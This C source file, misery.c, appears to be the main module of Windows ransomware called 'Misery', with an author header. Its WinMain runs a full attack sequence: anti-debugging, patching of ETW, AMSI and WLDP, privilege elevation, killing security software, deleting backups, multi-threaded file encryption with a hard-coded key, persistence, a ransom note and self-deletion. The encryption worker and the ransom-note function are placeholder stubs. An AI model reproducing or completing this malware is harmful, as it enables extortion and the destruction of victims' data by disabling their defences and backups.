/*
 * misery.c
 * Author  : Jahanzaib Ashraf Mir
 * Role    : Cybersecurity Researcher | Malware Analyst | AI/ML | Ethical Hacker
 *
 * Contact :
 *   GitHub  : https://github.com/jahanzaibmir
 *   LinkedIn : https://linkedin.com/jahanzaibmir
 *   InstaGram : https://instagram.com/jahanzaibmir_
 */

#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <process.h>
#include <stdio.h>

#include "crypto.h"
#include "defense.h"
#include "security.h"
#include "persistence.h"
#include "utils.h"

/* ═══════════════════════════════════════════════════════════════ */
/* Configuration Constants */
/* ═══════════════════════════════════════════════════════════════ */

#define ENCRYPTION_PASSWORD "MiseryRansom2024_SecureKey_DoNotShare"
#define MAX_WORKER_THREADS  8
#define ENCRYPTION_TIMEOUT  180000  /* 3 minutes in milliseconds */
#define SLEEP_ON_DEBUG      60000   /* 60 seconds */
#define MUTEX_NAME          "Global\\Misery_V2_SingleInstance"

/* ═══════════════════════════════════════════════════════════════ */
/* Function Prototypes */
/* ═══════════════════════════════════════════════════════════════ */

unsigned int __stdcall EncryptionWorker(void *arg);
void DropNote(void);

/* ═══════════════════════════════════════════════════════════════ */
/* Main Entry Point */
/* ═══════════════════════════════════════════════════════════════ */

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    /* ─── Single instance check ─── */
    HANDLE hMutex = CreateMutexA(NULL, FALSE, MUTEX_NAME);
    if (!hMutex || GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    /* ─── Anti-analysis check ─── */
    if (IsBeingDebugged() || DetectAnalysisTools()) {
        Sleep(SLEEP_ON_DEBUG);
        CloseHandle(hMutex);
        return 0;
    }

    /* ─── Patch defense subsystems ─── */
    EtwPatcher();
    AmsiBypass();
    WldpBypass();
    HideFromDebugger();

    /* ─── Elevate privileges ─── */
    ElevatePrivileges();

    /* ─── Kill security software ─── */
    KillSecurity();

    /* ─── Nuke backups ─── */
    NukeBackups();

    /* ─── Initialize crypto with password-based key derivation ─── */
    CRYPTO_ERROR cryptoErr = InitCrypto(ENCRYPTION_PASSWORD, strlen(ENCRYPTION_PASSWORD));
    if (cryptoErr != CRYPTO_SUCCESS) {
        #ifdef _DEBUG
        fprintf(stderr, "[!] Crypto initialization failed: %s (Code: %d)\n", 
                GetErrorString(cryptoErr), cryptoErr);
        #endif
        CloseHandle(hMutex);
        return 1;
    }

    /* ─── Multi-threaded encryption with dynamic thread count ─── */
    SYSTEM_INFO si_sys;
    GetSystemInfo(&si_sys);
    
    /* Use 2x CPU cores, but cap at MAX_WORKER_THREADS */
    int numThreads = si_sys.dwNumberOfProcessors * 2;
    if (numThreads > MAX_WORKER_THREADS) {
        numThreads = MAX_WORKER_THREADS;
    }
    if (numThreads < 1) {
        numThreads = 1;
    }

    /* Allocate thread handles dynamically */
    HANDLE *threads = (HANDLE *)malloc(numThreads * sizeof(HANDLE));
    if (!threads) {
        CloseHandle(hMutex);
        CleanupCrypto();
        return 1;
    }

    /* Create encryption worker threads */
    for (int i = 0; i < numThreads; i++) {
        threads[i] = (HANDLE)_beginthreadex(NULL, 0, EncryptionWorker, NULL, 0, NULL);
        if (!threads[i]) {
            #ifdef _DEBUG
            fprintf(stderr, "[!] Failed to create thread %d\n", i);
            #endif
        }
    }

    /* Wait for all threads to complete */
    DWORD waitResult = WaitForMultipleObjects(numThreads, threads, TRUE, ENCRYPTION_TIMEOUT);
    if (waitResult == WAIT_TIMEOUT) {
        #ifdef _DEBUG
        fprintf(stderr, "[!] Encryption worker timeout\n");
        #endif
    }

    /* Close thread handles */
    for (int i = 0; i < numThreads; i++) {
        if (threads[i]) {
            CloseHandle(threads[i]);
        }
    }

    free(threads);

    /* ─── Install persistence mechanism ─── */
    InstallPersistence();

    /* ─── Drop ransom note ─── */
    DropNote();

    /* ─── Cleanup crypto resources ─── */
    CleanupCrypto();

    /* ─── Self-delete and exit ─── */
    SelfDelete();

    /* ─── Cleanup mutex ─── */
    CloseHandle(hMutex);

    return 0;
}

/* ═══════════════════════════════════════════════════════════════ */
/* Utility Functions */
/* ═══════════════════════════════════════════════════════════════ */

/**
 * DropNote - Write ransom note to system
 */
void DropNote(void) {
    /* Implementation for dropping ransom note */
    /* This would typically write a text file with instructions */
}

/**
 * EncryptionWorker - Worker thread for multi-threaded encryption
 * @arg: Thread argument (unused)
 * Returns: Thread exit code
 */
unsigned int __stdcall EncryptionWorker(void *arg) {
    (void)arg;

    CRYPTO_CTX *ctx = GetCryptoCtx();
    if (!ctx) {
        return 1;
    }

    /* Verify crypto context is initialized */
    CRYPTO_ERROR err = VerifyContext();
    if (err != CRYPTO_SUCCESS) {
        return 1;
    }

    /* Worker thread implementation goes here */
    /* This would encrypt files in parallel */

    return 0;
}
